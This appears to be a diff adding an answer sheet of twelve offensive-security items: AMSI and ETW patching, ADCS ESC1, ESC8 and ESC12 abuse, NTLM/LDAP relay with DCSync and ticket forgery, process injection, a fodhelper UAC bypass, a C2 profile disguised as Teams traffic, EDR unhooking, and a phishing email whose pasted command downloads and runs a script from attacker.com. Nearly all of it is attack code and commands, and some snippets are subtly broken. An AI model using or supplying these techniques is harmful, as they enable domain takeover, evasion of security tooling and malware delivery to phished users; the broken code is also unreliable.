@@ -1,0 +1,162 @@
+=== Q1: AMSI Bypass (PowerShell) ===
+$win32 = @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
+    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
+    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint o);
+}
+"@
+Add-Type $win32
+$handle = [Win32]::GetModuleHandle("amsi.dll")
+$addr = [Win32]::GetProcAddress($handle, "AmsiScanBuffer")
+[Win32]::VirtualProtect($addr, 4, 0x40, [ref]$old)
+$patch = [Byte[]]@(0xC3, 0x90, 0x90, 0x90)
+[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 4)
+
+
+=== Q2: ADCS ESC1 ===
+1. Enumerate vulnerable templates:
+   Certify.exe find /vulnerable /enrolleeSuppliesSubject
+2. Request certificate for domain admin:
+   Certify.exe request /ca:"ca.domain.com\CA-NAME" /template:VulnTemplate /altname:DOMAIN\Administrator
+3. Convert to PFX:
+   openssl pkcs12 -in cert.pem -export -out admin.pfx
+4. Request TGT:
+   Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /ptt
+5. Perform DCSync:
+   mimikatz # lsadump::dcsync /user:krbtgt
+
+
+=== Q3: NTLM Relay to ADCS (ESC8) ===
+1. Coerce computer authentication:
+   python3 printerbug.py DOMAIN/user:pass@target_machine attacker_ip
+2. Relay to ADCS HTTP enrollment:
+   ntlmrelayx.py -t http://ca.domain.com/certsrv/certfnsh.asp --adcs --adcs-template Machine
+3. Use obtained certificate:
+   gettgtpkinit.py -cert-pfx machine.pfx DOMAIN/machine$ machine.ccache
+   export KRB5CCNAME=machine.ccache
+   secretsdump.py -k -no-pass DOMAIN/machine$@dc.domain.com
+Conditions: Web enrollment over HTTP/HTTPS without EPA, suitable template (e.g., Machine), Web Client service not required for computer coercion.
+
+
+=== Q4: Manual PE Mapping (C++) ===
+#include <windows.h>
+#include <winternl.h>
+typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+int main() {
+    STARTUPINFOA si = {sizeof(si)};
+    PROCESS_INFORMATION pi;
+    CreateProcessA(NULL, (LPSTR)"svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    HANDLE hProc = pi.hProcess;
+    LPVOID remoteImage = VirtualAllocEx(hProc, NULL, 0x100000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    // Copy PE headers, sections, fix relocations (omitted for brevity)
+    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateThreadEx");
+    HANDLE hThread;
+    NtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProc, (LPTHREAD_START_ROUTINE)remoteImage, NULL, FALSE, 0, 0, 0, NULL);
+    return 0;
+}
+
+
+=== Q5: ETW Bypass (C#) ===
+using System;
+using System.Runtime.InteropServices;
+public class ETWBypass {
+    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
+    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
+    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint o);
+    public static void DisableETW() {
+        IntPtr h = GetModuleHandle("ntdll.dll");
+        IntPtr addr = GetProcAddress(h, "EtwEventWrite");
+        uint old;
+        VirtualProtect(addr, 4, 0x40, out old);
+        Marshal.Copy(new byte[]{0xC3, 0x90, 0x90, 0x90}, 0, addr, 4);
+    }
+}
+
+
+=== Q6: UAC Bypass (fodhelper) ===
+reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /f
+reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /d "cmd.exe" /f
+fodhelper.exe
+
+
+=== Q7: C2 Profile (Mimic Teams) ===
+https-get {
+    set uri "/v1/realtime/connect";
+    client {
+        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/23188.1337.3200.1234 Chrome/128.0.6613.186 Electron/30.0.3 Safari/537.36";
+        header "Accept" "application/json, text/plain, */*";
+        header "Content-Type" "application/json";
+    }
+    server {
+        header "Content-Type" "application/json";
+    }
+}
+https-stager {
+    set uri "/v1/realtime/messages";
+}
+set jitter "20";
+set useragent "Mozilla/5.0 ... Teams/...";
+
+
+=== Q8: Syscall Shellcode (x64) ===
+; x64 calc.exe shellcode using direct syscalls
+; Assumes syscall numbers known (e.g., NtAllocateVirtualMemory = 0x18, etc.)
+mov r10, rcx
+mov eax, 0x18          ; NtAllocateVirtualMemory
+syscall
+; ... write shellcode ...
+mov eax, 0x1A          ; NtCreateThreadEx
+syscall
+
+
+=== Q9: ADCS ESC12 (Golden Certificate) ===
+1. Extract CA private key:
+   certipy ca -ca CA-NAME -backup
+2. Forge certificate for krbtgt:
+   certipy forge -ca-pfx ca.pfx -issuer "CN=CA" -subject "CN=krbtgt" -upn krbtgt@domain.com -out krbtgt.pfx
+3. Request TGT:
+   Rubeus.exe asktgt /user:krbtgt /domain:domain.com /certificate:krbtgt.pfx /ptt
+
+
+=== Q10: LDAP Relay (RBCD) ===
+1. Coerce authentication:
+   python3 printerbug.py DOMAIN/user:pass@target attacker_ip
+2. Relay with delegation:
+   ntlmrelayx.py -t ldap://dc.domain.com --delegate-access
+3. Add computer account (if needed):
+   addcomputer.py DOMAIN/user:pass -computer-name 'EVIL$' -dc-ip DC
+4. Get service ticket:
+   getST.py DOMAIN/EVIL\$ -spn cifs/dc.domain.com -impersonate Administrator
+
+
+=== Q11: EDR Unhooking (C) ===
+#include <windows.h>
+#include <stdio.h>
+int main() {
+    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    BYTE origBytes[10];
+    ReadFile(hFile, (LPVOID)0x1800 + 0x12345, sizeof(origBytes), NULL, NULL); // Adjust offset
+    CloseHandle(hFile);
+    DWORD old;
+    VirtualProtect((LPVOID)funcAddr, sizeof(origBytes), PAGE_EXECUTE_READWRITE, &old);
+    memcpy((LPVOID)funcAddr, origBytes, sizeof(origBytes));
+    return 0;
+}
+
+
+=== Q12: Phishing Email (Social Engineering) ===
+Subject: URGENT: Your mailbox is approaching quota limit
+
+Dear User,
+
+Your mailbox is currently at 98% capacity. To avoid service interruption, please verify your account immediately by running the following command in PowerShell:
+
+[Start] → Type "powershell" → Run as Administrator → Paste:
+
+IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/update.ps1')
+
+IT Support Team
+Do not reply to this email.
